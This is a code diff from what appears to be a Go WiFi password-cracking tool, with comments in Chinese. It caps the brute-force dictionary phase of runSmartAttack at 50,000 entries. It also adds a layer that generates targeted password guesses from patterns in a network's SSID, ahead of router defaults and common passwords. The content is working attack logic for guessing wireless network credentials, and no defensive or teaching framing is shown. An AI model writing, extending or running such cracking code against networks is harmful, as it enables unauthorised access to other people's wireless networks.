@@ -768,7 +768,14 @@ func runSmartAttack(targets []scanner.WiFiNetwork, dictFile string, delay int, v
 			}
 
 			if len(layer2) > 0 {
-				fmt.Printf("  [Phase 5b] 完整字典爆破（%d条，可能需要较长时间）...\n", len(layer2))
+				// 限制大字典最多5万条（200万条约111小时不现实）
+				maxLayer2 := 50000
+				if len(layer2) > maxLayer2 {
+					fmt.Printf("  [Phase 5b] 字典爆破（取前%d条，原%d条太多跳过）...\n", maxLayer2, len(layer2))
+					layer2 = layer2[:maxLayer2]
+				} else {
+					fmt.Printf("  [Phase 5b] 字典爆破（%d条）...\n", len(layer2))
+				}
 				r2 := cracker.CrackOne(t, layer2, crackCfg)
 				if r2.Success {
 					successCount++
@@ -804,9 +811,11 @@ func runSmartAttack(targets []scanner.WiFiNetwork, dictFile string, delay int, v
 // ============================================================
 func buildTopPasswords(ssid string) []string {
 	var top []string
-	// 路由器默认密码（根据SSID特征生成）
+	// 第1层：路由器默认密码（根据SSID品牌前缀生成）
 	top = append(top, cracker.GenerateRouterDefaults(ssid)...)
-	// 最高频的50个密码
+	// 第2层：SSID智能字典（根据SSID中的数字/字母模式生成针对性密码）
+	top = append(top, cracker.GenerateSSIDSmart(ssid)...)
+	// 第3层：最高频的50个通用密码
 	topN := dict.TopPasswords
 	if len(topN) > 50 {
 		topN = topN[:50]
